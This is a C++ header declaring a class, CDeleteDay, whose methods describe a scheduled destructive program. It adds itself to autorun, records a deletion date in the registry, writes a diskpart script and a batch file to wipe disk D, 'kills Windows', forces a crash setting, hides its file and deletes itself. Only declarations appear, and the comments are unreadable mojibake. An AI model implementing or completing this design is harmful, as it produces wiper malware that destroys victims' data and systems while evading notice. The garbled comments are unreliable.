#pragma once
class CDeleteDay
{
public:
	CDeleteDay();
	~CDeleteDay();

	// //��������� ���� ������������
	static bool AddToAutoRun();
	// ��������� �� �������� �� ���� ���������� �������
	static bool InspectDeleteData();

private:
	// ���������� � ������ ����� ���������� ������
	bool SaveDeleteDay();
	// ���������� ����� ����� ����� �������
	bool SaveFolderPathToDelete();
	
	bool DeleteFolder();
	bool PerformATask();
	bool IfDeleteDiskD();
	bool IfKillWindows();
	void ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month);
	void GetCurrentDay(int& DelDay, int& DelDayOfWeek, int& Month);
	bool CreateDiskpartScript(wchar_t szFileDiskPart[], wchar_t szTempPath[], wchar_t szFilePath[]);
	bool CreateBatFile(wchar_t szFileBat[], wchar_t szTempPath[], wchar_t szFilePath[], wchar_t szFileExe[], wchar_t szFileDiskPart[]);
	void KeyBoardLedBlink(void);
	void DoKillWindows();

	bool EnableCrashOnCtrlScroll();
	bool DeleteDiskD();
	bool SaveTaskKillWindows();

	void SelfDelete();
	void HideFile();
};

